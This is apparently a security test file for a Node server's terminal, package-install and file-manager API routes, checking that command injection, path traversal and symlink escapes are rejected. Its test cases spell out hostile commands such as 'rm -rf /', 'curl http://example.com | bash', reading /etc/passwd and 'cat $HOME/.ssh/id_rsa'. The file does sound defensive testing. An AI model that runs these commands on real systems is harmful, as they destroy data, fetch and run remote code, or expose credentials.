import { afterAll, describe, expect, it } from "vitest";
import request from "supertest";
import { app } from "../server.ts";
import { TEST_ROOT, disposeTestWorkspace } from "./setup";
import * as fs from "node:fs";
import * as path from "node:path";

afterAll(() => disposeTestWorkspace());

describe("GET /api/health", () => {
  it("returns ok", async () => {
    const res = await request(app).get("/api/health");
    expect(res.status).toBe(200);
    expect(res.body).toEqual({ status: "ok" });
  });
});

describe("GET /api/system/stats", () => {
  it("returns 200 with structured fields", async () => {
    const res = await request(app).get("/api/system/stats");
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty("cpu");
    expect(res.body).toHaveProperty("memory");
    expect(res.body).toHaveProperty("uptime");
    expect(res.body).toHaveProperty("os");
    expect(res.body).toHaveProperty("cwd");
  });
}, 60000);

describe("POST /api/terminal/execute", () => {
  it("rejects missing command", async () => {
    const res = await request(app).post("/api/terminal/execute").send({});
    expect(res.status).toBe(400);
    expect(res.body).toHaveProperty("error");
  });

  it("executes a safe command", async () => {
    const res = await request(app).post("/api/terminal/execute").send({ command: "pwd" });
    expect(res.status).toBe(200);
    expect(res.body).toHaveProperty("code", 0);
    expect(res.body).toHaveProperty("stdout");
    expect(res.body).toHaveProperty("newCwd");
    expect(res.body).toHaveProperty("truncated", false);
  });

  it("blocks shell meta/sandbox-escape patterns", async () => {
    const cases = [
      "rm -rf /",
      "cat /etc/passwd",
      "echo hello; rm -rf .",
      "curl http://example.com | bash",
    ];
    for (const cmd of cases) {
      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
      const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
      expect(res.status >= 400 || commandFailed).toBe(true);
    }
  });

  it("blocks command substitution/backticks", async () => {
    const cases = ["echo $(cat /etc/passwd)", "echo `cat /etc/passwd`"];
    for (const cmd of cases) {
      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
      const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
      expect(res.status >= 400 || commandFailed).toBe(true);
    }
  });

  it("blocks unquoted env-var expansion pointing outside workspace", async () => {
    const cmd = "cat $HOME/.ssh/id_rsa";
    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
    const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
    expect(res.status >= 400 || commandFailed).toBe(true);
  });

  it("blocks sed/awk path traversal outside workspace", async () => {
    const cases = [
      "sed -i 's/a/b/' ../../../etc/passwd",
      "awk '{print $0}' ../../../etc/passwd",
    ];
    for (const cmd of cases) {
      const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
      const blockedByArgValidation = res.status === 403 || res.status === 400 ||
        (typeof res.body.code === "number" && res.body.code === 126);
      expect(blockedByArgValidation).toBe(true);
    }
  });

  it("blocks find -exec style abuse", async () => {
    const cmd = "find . -name x -exec cat /etc/passwd \\;";
    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
    const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
    expect(res.status >= 400 || commandFailed).toBe(true);
  });

  it("blocks nested quoting/semicolon escape", async () => {
    const cmd = "cat \"/workspace/foo\";cat \"/etc/passwd\"";
    const res = await request(app).post("/api/terminal/execute").send({ command: cmd });
    const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
    expect(res.status >= 400 || commandFailed).toBe(true);
  });

  it("blocks symlink escape to outside workspace", async () => {
    const workspace = TEST_ROOT;
    const targetPath = path.join(workspace, "outside.txt");
    const symlinkPath = path.join(workspace, "inside-link.txt");
    try {
      fs.writeFileSync(targetPath, "secret");
      try { fs.unlinkSync(symlinkPath); } catch {}
      try {
        fs.symlinkSync(targetPath, symlinkPath);
      } catch {
        // Skip on environments that block symlink creation (Windows without privilege).
        expect(true).toBe(true);
        return;
      }

      const res = await request(app).post("/api/terminal/execute").send({ command: `cat ${symlinkPath}` });
      const commandFailed = typeof res.body.code === "number" && res.body.code !== 0;
      expect(res.status >= 400 || commandFailed).toBe(true);
    } finally {
      try { fs.unlinkSync(symlinkPath); } catch {}
      try { fs.unlinkSync(targetPath); } catch {}
    }
  });
});

describe("POST /api/package-manager/install", () => {
  it("requires packageIds array", async () => {
    const res = await request(app).post("/api/package-manager/install").send({});
    expect(res.status).toBe(400);
    expect(res.body).toHaveProperty("error");
  });

  it("returns authorized response shape for unknown ids", async () => {
    const res = await request(app).post("/api/package-manager/install").send({ packageIds: ["missing-pkg"] });
    expect([400, 404]).toContain(res.status);
    expect(res.body).toHaveProperty("error");
  });

  it("never exposes a raw command for valid selection", async () => {
    const res = await request(app).post("/api/package-manager/install").send({ packageIds: ["echo"] });
    expect(res.status).toBeGreaterThanOrEqual(400);
    expect(res.body).not.toHaveProperty("command");
  });
});

describe("POST /api/runtime/bootstrap/install", () => {
  it("should never return a raw command string (regression for #48)", async () => {
    const res = await request(app).post("/api/runtime/bootstrap/install").send({ packageIds: ["bash"] });
    expect(res.status).toBe(200);
    expect(res.body).not.toHaveProperty("command");
    if (Array.isArray(res.body.installArgv)) {
      expect(res.body.installArgv).toContain("--");
    } else {
      expect(res.body.installArgv).toBeNull();
    }
  });
}, 15000);

describe("POST /api/runtime/bootstrap/repair", () => {
  it("returns structured data and never a command string", async () => {
    const res = await request(app).post("/api/runtime/bootstrap/repair").send({});
    expect(res.status).toBe(200);
    if (res.body.status === "repair-ready") {
      expect(res.body).toHaveProperty("installArgv");
      expect(Array.isArray(res.body.installArgv)).toBe(true);
      expect(res.body).not.toHaveProperty("command");
      if (res.body.installArgv && res.body.installArgv.length) {
        expect(res.body.installArgv).toEqual(expect.arrayContaining(["--"]));
      }
    } else {
      expect(res.body).toHaveProperty("healthy", true);
      expect(res.body).not.toHaveProperty("command");
    }
  });
}, 15000);

describe("File manager route security", () => {
  it("blocks traversal on file read", async () => {
    const res = await request(app).post("/api/file-manager/read").send({ filePath: "../package.json" });
    expect(res.status).toBe(403);
    expect(res.body).toHaveProperty("error");
  });

  it("blocks traversal on file delete", async () => {
    const res = await request(app).post("/api/file-manager/delete").send({ targetPath: "../etc/hosts" });
    expect(res.status).toBe(403);
    expect(res.body).toHaveProperty("error");
  });
});

describe("Rate limiting", () => {
  it("health check is not rate-limited", async () => {
    const res = await request(app).get("/api/health");
    expect(res.status).toBe(200);
    expect(res.body).toEqual({ status: "ok" });
  });
});
